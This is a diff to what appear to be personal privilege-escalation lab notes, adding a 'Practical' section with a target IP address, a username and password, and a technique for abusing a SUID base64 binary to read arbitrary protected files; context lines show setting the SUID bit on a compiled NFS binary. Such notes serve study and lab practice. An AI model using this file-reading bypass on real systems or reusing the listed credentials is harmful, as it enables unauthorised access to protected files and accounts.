@@ -333,3 +333,20 @@ int main()
 ```
 `gcc nfs.c -o nfs`
 `chmod +s nfs`
+
+___
+### Practical
+[[#Table of contents|Back to the top]]
+
+10.80.136.191
+
+leonard
+Penny123
+
+SUID: base64
+
+```
+LFILE=file_to_read
+base64 "$LFILE" | base64 --decode
+```
+
